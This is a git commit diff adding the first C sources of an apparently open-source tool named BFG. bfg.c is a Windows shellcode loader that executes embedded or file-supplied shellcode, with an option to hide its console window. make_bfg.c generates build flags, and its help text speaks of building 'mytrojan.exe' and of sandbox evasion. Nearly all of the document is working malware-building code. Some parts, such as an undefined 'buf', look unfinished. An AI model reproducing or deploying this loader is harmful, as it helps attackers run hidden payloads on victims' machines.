de9ebd50d66699adc51f4289025d7c6a68da701c
Daniel Sauder <daniel.sauder@web.de>
2017-02-06 16:10:58 +0100

    start project with some basics

---
+++ bfg.c
@@ -0,0 +1,192 @@
+/*
+Author: Daniel Sauder
+License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
+Web: https://github.com/govolution/bfg
+*/
+
+//     "         .==,_                                          \n"
+//     "        .===,_`\\                                        \n"
+//     "      .====,_ ` \\      .====,__                         \n"
+//     "---     .==-,`~. \\           `:`.__,                    \n"
+//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
+//     "   ---       `~~=. \\         /                          \n"
+//     "                `~. \\       /                           \n"
+//     "                  ~. \\____./                            \n"
+//     "                    `.=====)                            \n"
+//     "                 ___.--~~~--.__                         \n"
+//     "       ___\\.--~~~              ~~~---.._|/              \n"
+//     "       ~~~\\\"                             /              \n"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <windows.h>
+#include <tchar.h>
+#include "defs.h"
+
+int get_filesize(char *fvalue);
+unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
+void exec_shellcode(unsigned char *shellcode);
+void exec_shellcode64(unsigned char *shellcode);
+
+int main (int argc, char **argv)
+{
+	#ifdef QUIET
+		ShowWindow(GetConsoleWindow(), SW_HIDE);
+	#endif
+		
+	char *fvalue = NULL;
+	//char *uvalue = NULL;
+
+	int index;
+	int c;
+
+	opterr = 0;
+
+	#ifdef LVALUE
+		fvalue=argv[1];
+	#endif
+
+	#ifdef PRINT_DEBUG
+		printf ("fvalue = %s ", fvalue);
+		for (index = optind; index < argc; index++)
+			printf ("Non-option argument %s\n", argv[index]);
+	#endif
+
+// compute #defines from defs.h
+#ifdef FVALUE
+	int size = strlen(FVALUE);
+	fvalue=(char*)malloc(size);
+	strcpy(fvalue,FVALUE);
+#endif
+
+	// exec shellcode from a given file or from defs.h
+	if (fvalue)
+	{
+		unsigned char *buffer;
+		unsigned char *shellcode;
+		int size;
+//#ifndef FVALUE
+#ifdef LVALUE
+	#ifdef PRINT_DEBUG
+		printf("exec shellcode from file\n");
+	#endif
+		size = get_filesize(fvalue);
+		buffer = load_textfile(fvalue, buffer, size);
+#endif
+	#ifdef FVALUE
+		size = strlen (FVALUE);
+		buffer = FVALUE;
+	#endif
+
+	#ifndef ENCRYPT
+	#ifndef ASCIIMSF 
+		#ifdef PRINT_DEBUG
+		printf("exec shellcode without decode_shellcode\n");
+		#endif
+		shellcode = buf;
+	#endif
+	#endif
+	#ifndef X64 
+		exec_shellcode(shellcode);
+	#endif
+	#ifdef X64
+		exec_shellcode64(shellcode);
+	#endif
+	}
+
+	return 0;
+}
+
+
+#if defined(LVALUE) || defined(UVALUE)
+int get_filesize(char *fvalue)
+{
+	int size,rc1;
+	FILE *fp1 = fopen(fvalue, "rb");
+	if (fp1 == NULL)
+	{
+		printf("get_filesize, %s not found\n", fvalue);
+		return 0;
+	}
+	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
+	fclose(fp1);
+	
+	#ifdef PRINT_DEBUG
+		printf("get_filesize, filesize %s: %d\n", fvalue, size);
+	#endif
+
+	return size;
+}
+#endif
+
+#if defined(LVALUE) || defined(UVALUE)
+// return pointer to text buffer
+unsigned char* load_textfile(char *fvalue, unsigned char *buffer, int size)
+{
+	#ifdef PRINT_DEBUG
+		printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);
+	#endif
+
+	//allocate buffer, open file, read file to the buffer, close the file
+	buffer=(unsigned char*)malloc(size+1);
+	int i, rc;
+
+	for (i=0; i<size; i++)
+		buffer[i]=0x0;
+
+	FILE *fp = fopen(fvalue, "rb");
+	if (fp == NULL)
+	{
+		printf("load_textfile, %s not found\n", fvalue);
+		return 0;
+	}
+
+	for (i=0; i<size; i++)
+	{
+		rc = getc(fp);
+		buffer[i] = rc;
+	}
+
+	#ifdef PRINT_DEBUG
+		printf("%s\n",buffer);
+	#endif
+
+	fclose(fp);
+	return buffer;
+}
+#endif
+
+
+#ifndef X64
+void exec_shellcode(unsigned char *shellcode)
+{
+	#ifdef PRINT_DEBUG
+		printf("exec_shellcode\n ");
+		int size=strlen(shellcode);
+		printf("shellcode size: %d\n", size);
+	#endif
+
+	int (*funct)();
+	funct = (int (*)()) shellcode;
+	(int)(*funct)();
+}
+#endif
+
+
+#ifdef X64
+void exec_shellcode64(unsigned char *shellcode)
+{
+#ifdef PRINT_DEBUG
+	printf("exec_shellcode64\n ");
+	int size=strlen(shellcode);
+	printf("shellcode size: %d\n", size);
+#endif
+	int len=strlen(shellcode);
+	DWORD l=0;
+	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);
+	(* (int(*)()) shellcode)();
+}
+#endif
+
---
+++ make_bfg.c
@@ -0,0 +1,200 @@
+/*
+Author: Daniel Sauder
+License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
+Web: https://github.com/govolution/bfg
+*/
+
+#include <getopt.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void print_start();
+void print_help();
+int print_debug;
+int load_from_file;
+
+int main (int argc, char **argv)
+{
+	print_start();
+
+	print_debug = 0;
+	load_from_file = 0;
+	char *dvalue = NULL;
+	char *evalue = NULL;
+	char *fvalue = NULL;
+	int hflag = 0;
+	int Fflag = 0;
+	int Xflag = 0;
+	int Eflag = 0;
+	int Aflag = 0;
+	int qflag = 0;
+
+	int index;
+	int c;
+
+	opterr = 0;
+
+	// compute the options
+	while ((c = getopt (argc, argv, "d:e:f:u:w:lphFXq")) != -1)
+		switch (c)
+		{
+			case 'd':
+				dvalue = optarg;
+				break;
+			case 'e':
+				evalue = optarg;
+				break;
+			case 'l':
+				load_from_file = 1;
+				break;
+			case 'f':
+				fvalue = optarg;
+				break;
+			case 'h':
+				hflag = 1;
+				break;
+			case 'F':
+				Fflag = 1;
+				break;
+			case 'X':
+				Xflag = 1;
+				break;
+			case 'q':
+				qflag = 1;
+				break;
+			case 'p':
+				print_debug = 1;
+				break;
+			case '?':
+				if (optopt == 'd')
+					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
+				else if (optopt == 'e')
+					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
+				else if (optopt == 'f')
+					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
+				else if (isprint (optopt))
+					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
+				else
+					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
+				return 1;
+			default:
+				abort ();
+		}
+
+	// print help
+	if (hflag)
+		print_help();
+	else if (load_from_file)
+	{
+		//write LVALUE to defs.h
+		FILE *file_def;
+		file_def = fopen ("defs.h","w");
+
+		if (file_def == NULL)
+		{
+			printf ("Error open defs.h\n");
+			return -1;
+		}
+
+		fprintf (file_def, "#define LVALUE\n");
+		fclose(file_def);
+	}
+	
+	// write shellcode from a given file to defs.h
+	else if (fvalue)
+	{
+		printf ("write shellcode from %s to defs.h\n", fvalue);
+
+		FILE *file_def;
+		file_def = fopen ("defs.h","w");
+
+		if (file_def == NULL)
+		{
+			printf ("Error open defs.h\n");
+			return -1;
+		}
+
+		fseek (file_def, 0, SEEK_END);
+
+		// read the shellcode file, write to defs.h
+		FILE *file_sh = fopen ( fvalue, "r" );
+
+		if ( file_sh != NULL )
+		{
+			if(Eflag)
+				fprintf (file_def, "#define FVALUE \"");
+			else
+				fprintf (file_def, "#define FVALUE \"\"\n");
+
+			char line [ 5000 ];
+
+			while ( fgets ( line, sizeof line, file_sh ) != NULL )
+				fprintf (file_def, "%s", line);           
+
+			if(Eflag)
+				fprintf (file_def, "\"\n");
+			//fprintf (file_def, "\\n");
+			fclose ( file_sh );
+		}
+		else
+			printf ("Error open %s\n", fvalue);
+
+		fclose (file_def);
+	}
+
+	//write flags to defs.h
+	FILE *file_def;
+	file_def = fopen ("defs.h","a");
+	if (file_def == NULL)
+	{
+		printf ("Error open defs.h\n");
+		return -1;
+	}
+
+	//write LVALUE to defs.h
+	if(print_debug)
+		fprintf (file_def, "#define PRINT_DEBUG\n");
+
+	//write SANDBOX_FOPEN to defs.h
+	if(Fflag)
+		fprintf (file_def, "#define SANDBOX_FOPEN\n");
+
+	//write X64 to defs.h
+	if(Xflag)
+		fprintf (file_def, "#define X64\n");
+	if(qflag)
+		fprintf (file_def, "#define QUIET\n");
+
+	fclose(file_def);
+
+} //main
+
+void print_help()
+{
+	printf("Options:\n");
+	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
+	printf("-f compile shellcode into .exe, needs filename of shellcode file\n");
+	printf("-k \"killswitch\" sandbox evasion with gethostbyname\n");
+	printf("-X compile for 64 bit\n");
+	printf("-p print debug information\n");
+	printf("-q quiet mode (hide console window)\n");
+	printf("-h help\n\n");
+	printf("Please refer README.md for more information\n");
+}
+
+void print_start()
+{
+//http://patorjk.com/software/taag/#p=display&f=3D-ASCII&t=BFG
+char output[] =
+" ________  ________ ________     \n"
+"|\\   __  \\|\\  _____\\\\   ____\\ \n"   
+"\\ \\  \\|\\ /\\ \\  \\__/\\ \\  \\___| \n"   
+" \\ \\   __  \\ \\   __\\\\ \\  \\  ___  \n"
+"  \\ \\  \\|\\  \\ \\  \\_| \\ \\  \\|\\  \\ \n"
+"   \\ \\_______\\ \\__\\   \\ \\_______\\ \n"
+"    \\|_______|\\|__|    \\|_______| \n"
+		"\n\nBinary Fancy Generator by Daniel Sauder\n"
+		"use -h for help\n\n";
+	printf("\n%s", output);
+}
